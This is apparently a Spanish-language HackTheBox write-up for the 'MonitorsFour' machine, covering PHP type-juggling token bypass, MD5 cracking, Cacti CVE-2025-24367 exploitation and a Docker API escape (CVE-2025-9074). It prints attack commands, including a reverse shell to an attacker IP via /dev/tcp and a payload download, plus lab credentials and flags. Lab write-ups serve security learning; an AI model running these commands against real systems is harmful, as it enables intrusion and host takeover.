---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# MonitorsFour HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 12:02 CET
Nmap scan report for 10.10.11.98
Host is up (0.10s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```

Veremos que hay solamente dos puertos que pertenece al `WinRM` y el otro a una pagina web la cual tambien vemos que nos lleva al dominio llamado `monitorsfour.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>         monitorsfour.htb
```

Lo guardamos y entraremos a dicho `dominio`:

```
URL = http://monitorsfour.htb/
```

Veremos una pagina normal, por lo que vamos a realizar un escaneo con `nuclei` a ver que vemos.

## Nuclei

```shell
nuclei -u http://monitorsfour.htb \
  -t /root/.local/nuclei-templates/ \
  -severity low,medium,high,critical \
  -rate-limit 50 \
  -timeout 10 \
  -retries 2 \
  -headless \
  -system-resolvers \
  -stats \
  -si 1800 \
  -project \
  -nc \
  -o gavel_nuclei_scan.txt
```

Info:

```
                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[INF] Your current nuclei-templates v10.3.4 are outdated. Latest is v10.3.5
[INF] Successfully updated nuclei-templates (v10.3.5) to /root/.local/nuclei-templates. GoodLuck!

Nuclei Templates v10.3.5 Changelog
┌───────┬───────┬──────────┬─────────┐
│ TOTAL │ ADDED │ MODIFIED │ REMOVED │
├───────┼───────┼──────────┼─────────┤
│ 3581  │ 60    │ 3520     │ 1       │
└───────┴───────┴──────────┴─────────┘
[WRN] Found 1 templates with syntax error (use -validate flag for further examination)
[INF] Current nuclei version: v3.4.10 (outdated)
[INF] Current nuclei-templates version: v10.3.5 (latest)
[INF] New templates added in latest release: 57
[INF] Templates loaded for current scan: 5833
[INF] Executing 5831 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 2 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 414 (Reduced 361 Requests)
[INF] Using Interactsh Server: oast.online
[codeigniter-env] [http] [high] http://monitorsfour.htb/.env [paths="/.env"]
[laravel-env] [http] [high] http://monitorsfour.htb/.env [paths="/.env"]
[generic-env] [http] [high] http://monitorsfour.htb/.env [paths="/.env"]
[0:04:35] | Templates: 5833 | Hosts: 1 | RPS: 47 | Matched: 3 | Errors: 162 | Requests: 13097/13292 (98%)
[INF] Scan completed in 4m. 3 matches found.
[0:04:35] | Templates: 5833 | Hosts: 1 | RPS: 47 | Matched: 3 | Errors: 162 | Requests: 13097/13292 (98%)
```

Veremos que encontro algo bastante critico que es un `.env` expuesto en la web, si lo inspeccionamos veremos lo siguiente:

```
URL = http://monitorsfour.htb/.env
```

Info:

```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```

Vemos que es una conexion a una `DDBB`, si probamos esta contraseña junto con este usuario en cualquier login o `WinRM` veremos que no da exito, por lo que vamos a realizar un `fuzzing` a nivel de `subdominios` a ver si vemos algo.

## FFUF

```shell
ffuf -c -w <WORDLIST> -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -fs 138
```

Info:

```

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsfour.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.monitorsfour.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 138
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1212ms]
```

Veremos que encontro uno llamado `cacti`, vamos añadirlo a nuestro archivo `hosts` de esta forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>         monitorsfour.htb cacti.monitorsfour.htb
```

Lo guardamos y entraremos dentro a ver que vemos.

```
URL = http://cacti.monitorsfour.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-08 122258.png" alt=""><figcaption></figcaption></figure>

Vemos lo que es un `login` pero algo bastante interesante es que es un `software` de terceros, con una version de `1.2.28`, si buscamos algun `exploit` relacionado con el mismo veremos que tuvo algunas vulnerabilidades en anteriores versiones, pero en esta en especifico no veremos nada interesante.

Si volvemos a la pagina principal despues de estar buscando un rato, veremos que hay una `API` que se solicita desde el parametro `user`.

```
URL = http://monitorsfour.htb/user
```

Info:

```
{"error":"Missing token parameter"}
```

Vemos que requiere literalmente de un parametro llamado `token` por lo que vamos a ponerselo.

```
URL = http://monitorsfour.htb/user?token=1234
```

Info:

```
{"error":"Invalid or missing token"}
```

Metiendole cualquier valor veremos que lo esta intentando validar, pero que el `TOKEN` no es el correcto, esto sugiere que se esta realizando una validacion basada en `TOKEN`.

Si tambien analizamos el `PHP` que se esta ejecutando por dentro veremos esta version desde `Wappalyzer`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-08 123858.png" alt=""><figcaption></figcaption></figure>

Lo primero que se nos viene a la mente es probar a realizar algun comportamiento raro respecto a `PHP` para confirmar alguna vulnerabilidad, en este caso vamos a probar `PHP Type Juggling (Loose Comparison)`.

Esta vulnerabilidad se basa en los operadores:

* `==` (igualdad débil) - **¡PELIGROSO!**
* `!=` (diferente débil)
* `<>` (diferente débil)
* `in_array()` sin tercer parámetro `true`
* `array_search()` sin `strict=true`

Por lo que podemos probar algunos de estos `payloads`:

```
/user?token=0          # "0" == "KEY_SECRET" = false, pero...
/user?token=0e1        # Si token empieza con 0e...
/user?token=0E0        # Variaciones
/user?token=true       # Truthy values
/user?token=1          # "1" == "SECRET12345" = ? 
/user?token[]=         # Array vs string
```

Si probamos el primero:

```
URL = http://monitorsfour.htb/user?token=0
```

Info:

```
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

Veremos que tenemos exito ya que estamos aprovechando la vulnerabilidad de `PHP` por como este formada la logica por detras en el `backend` la aplicacion.

Vamos a meter en un `users.txt` y `passwords.txt` todo lo que hemos obtenido, simplemente por tenerlos guardados.

> users.txt

```
admin
mwatson
janderson
dthompson
```

> passwords.txt

```
56b32eb43e6f15395f6c46c1c9e1cd36
69196959c16b26ef00b77d82cf6eb169
2a22dcf99190c322d974c8df5ba3256b
8d4a7e7fd08555133e056d9aacb1e519
```

> hash

```
admin:56b32eb43e6f15395f6c46c1c9e1cd36
mwatson:69196959c16b26ef00b77d82cf6eb169
janderson:2a22dcf99190c322d974c8df5ba3256b
dthompson:8d4a7e7fd08555133e056d9aacb1e519
```

> tokens

```
admin:8024b78f83f102da4f
mwatson:0e543210987654321
janderson:0e999999999999999
dthompson:0e111111111111111
```

Vamos a crearnos un archivo llamado `hash` para intentar `crackear` estos usuarios a ver cuales se pueden.

## John (crack)

```shell
john --format=Raw-MD5 --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 4 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
wonderful1       (admin)
1g 0:00:00:01 DONE (2025-12-08 12:53) 0.5555g/s 7968Kp/s 7968Kc/s 23914KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado y obtendremos las credenciales del `admin`, por lo que vamos a iniciar sesion en la pagina principal del `login`.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-08 125611.png" alt=""><figcaption></figcaption></figure>

Veremos un `dashboard` cuando entremos dentro, pero nada interesante, si las probamos en el `cacti` veremos que no van, pero vamos a probarlas de forma manual con cada usuario encontrado en dicho `software` a ver si la contarseña es la misma para otro usuario en `cacti`.

Una vez probado todas veremos que no funciona, por lo que despues de darle vueltas un rato, detectamos que el unico que no tiene un nombre real acortado es el de `admin` que se llama `Marcus Higgins`, vamos a probar con `marcus o mhiggins` como esta formado en los demas usuarios.

## Escalate user www-data

### CVE-2025-24367 Authenticated (Explotación)

Si probamos estas credenciales de aqui:

```
User: marcus
Pass: wonderful1
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-08 130646.png" alt=""><figcaption></figcaption></figure>

Veremos que nos inicia sesion con exito, por lo que vamos a buscar alguna vulnerabilidad con la version `1.2.28` de `cacti` a ver si vemos algo.

Buscando un rato veremos esta pagina de aqui:

URL = [GitHub Explicacion Vuln 1.2.28 Cacti](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq)

Vemos que nos explica la vulnerabilidad que tiene asociada a dicha version y el `CVE` que es, que seria el `CVE-2025-24367`, por lo que vamos a buscar por dicho `CVE` a ver si vemos algun `PoC` subido.

Si buscamos un rato veremos este `GitHub`.

URL = [PoC CVE-2025-24367 Exploit](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC)

Nos descargamos el archivo llamado `exploit.py` y preparamos el entorno:

```shell
python3 -m venv venv
source venv/bin/activate
pip install requests beautifulsoup4
```

Una vez preparado y teniendo dicho archivo, vamos a ejecutarlo de esta forma:

```shell
python3 exploit.py -u marcus -p 'wonderful1' -i <IP_ATTACKER> -l <PORT> -url http://cacti.monitorsfour.htb
```

Ahora antes de darle a ejecutar, vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Si le damos a ejecutar veremos lo siguiente:

```
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: OBoaw.php
[+] Got payload: /bash
[i] Created PHP filename: bJhMd.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

Y si volvemos a donde tenemos la escucha veremos esto otro:

```
listening on [any] 7777 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.98] 61958
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ whoami
whoami
www-data
```

Vemos que funciono y seremos el usuario `www-data` por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Una vez hecho esto leeremos la `flag` del usuario.

> user.txt

```
a3361dad3e400c168899ed6440112098
```

## Escalate Privileges

Vamos a realizar un escaneo de `redes` a ver que nos encontramos.

```shell
ip a
```

Info:

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo
       valid_lft forever preferred_lft forever
2: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether ca:05:92:d2:da:cb brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

No veremos nada interesante, ahora vamos a ver que `host` puede estar resolviendo la maquina.

### Herramienta fscan (Fuzzing network)

```shell
cat /etc/resolv.conf
```

Info:

```
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.

nameserver 127.0.0.11
options ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
# Overrides: []
# Option ndots from: internal
```

En esta parte si vemos algo interesante, vemos una `IP` interna la cual vamos a realizarle un escaneo de puertos como si lo hicieramos con `nmap` pero con un binario que esta mucho mejor en estos casos llamado `fscan`.

URL = [GitHub fscan Tool](https://github.com/shadow1ng/fscan/releases)

Vamos a descargarnos el binario para `linux` y nos lo pasaremos a la maquina victima mediante `PHP` de esta forma:

Abriremos un servidor de `python3` en nuestra maquina atacante, que es donde esta el binario de `fscan` que nos hemos descargado.

```shell
python3 -m http.server 80
```

Ahora en la maquina victima ejecutaremos esto:

```shell
cd /tmp
echo '<?php file_put_contents("fscan", file_get_contents("http://<IP_ATTACKER>/fscan")); ?>' | php
chmod +x fscan
```

Hecho esto vamos a ejecutar el escaneo de esta forma:

```shell
./fscan -h 192.168.65.7 -p 1-65535
```

Info:

```
   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.65.7:53 open
192.168.65.7:2375 open
192.168.65.7:3128 open
192.168.65.7:5555 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle http://192.168.65.7:2375  code:404 len:29     title:None
[*] WebTitle http://192.168.65.7:5555  code:200 len:0      title:None
[+] PocScan http://192.168.65.7:2375 poc-yaml-docker-api-unauthorized-rce
[+] PocScan http://192.168.65.7:2375 poc-yaml-go-pprof-leak
已完成 4/4
[*] 扫描结束,耗时: 44.071852455s
```

Veremos que encontro en la `IP` una vulnerabilidad en el puerto `2375`, vamos a probar la que nos dice `poc-yaml-docker-api-unauthorized-rce`, si buscamos informacion sobre esta vuln veremos que esta asociada a un `CVE-2025-9074` podemos sacar mas info de esta pagina:

URL = [Info CVE-2025-9074 Vulnerabilidad](https://socprime.com/blog/cve-2025-9074-docker-desktop-vulnerability/)

### Explotación CVE-2025-9074 (Docker)

Vamos a buscar algun `PoC` que este asociado a dicho `CVE` encontraremos el siguiente:

URL = [GitHub PoC CVE-2025-9074 Exploit](https://github.com/j3r1ch0123/CVE-2025-9074/blob/main/exploit.py)

Leyendo el codigo y entendiendolo podremos ver que esta aprovechando la `API` de `docker` para crear contenedores y asi poder obtener una `reverse shell`, por lo que vamos hacerlo de forma manual.

```shell
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/create \
  -d '{
    "Image": "docker_setup-nginx-php:latest",
    "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.19/4455 0>&1"],
    "HostConfig": {
      "Binds": ["/mnt/host/c:/host_root"]
    }
  }'
```

Info:

```
{"Id":"d329bc4931104b0d0c81e55004c937dcb5f682423b358000d8979d5db7845284","Warnings":[]}
```

Esto que acabamos de hacer es que hemos montado todo el contenido de `Windows` en la carpeta del contenedor llamada `host_root`, por lo que ahora vamos a ponernos a la escucha.

```shell
nc -lvnp <PORT>
```

Volveremos a la terminal victima y vamos a iniciar el contenedor de esta forma:

```shell
curl -X POST http://192.168.65.7:2375/containers/d329bc4931104b0d0c81e55004c937dcb5f682423b358000d8979d5db7845284/start
```

Si volvemos donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 4455 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.98] 51752
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@d329bc493110:/var/www/html# whoami
whoami
root
```

Veremos que ya seremos `root` dentro del contenedor, recordemos que hemos montado en la carpeta `host_root` de la raiz todo el entorno de `Windows` por lo que vamos a explorarla.

```shell
ls -la /host_root
```

Info:

```
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
total 4
drwxrwxrwx 1 root root 4096 Nov 11 12:49 $RECYCLE.BIN
drwxrwxrwx 1 root root 4096 Dec  2 12:08 $WinREAgent
drwxrwxrwx 1 root root 4096 Dec  2 12:02 .
drwxr-xr-x 1 root root 4096 Dec  8 13:30 ..
lrwxrwxrwx 1 root root   17 Mar 24  2025 Documents and Settings -> /mnt/host/c/Users
-????????? ? ?    ?       ?            ? DumpStack.log.tmp
drwxrwxrwx 1 root root 4096 Apr  1  2024 PerfLogs
drwxrwxrwx 1 root root 4096 Nov  3 23:00 Program Files
drwxrwxrwx 1 root root 4096 Apr  1  2024 Program Files (x86)
drwxrwxrwx 1 root root 4096 Nov  3 23:00 ProgramData
drwxrwxrwx 1 root root 4096 Mar 24  2025 Recovery
d--x--x--x 1 root root 4096 Mar 24  2025 System Volume Information
drwxrwxrwx 1 root root 4096 Nov  3 11:18 Users
drwxrwxrwx 1 root root 4096 Dec  2 16:08 Windows
drwxrwxrwx 1 root root 4096 Mar 24  2025 Windows.old
drwxrwxrwx 1 root root 4096 Nov 11 17:20 inetpub
-????????? ? ?    ?       ?            ? pagefile.sys
```

Vemos que ha funcionado, vamos a leer la `flag` directamente de esta forma:

```shell
cat /host_root/Users/Administrator/Desktop/root.txt
```

> root.txt

```
cd38445935f1bfb04af99c50b176ea89
```
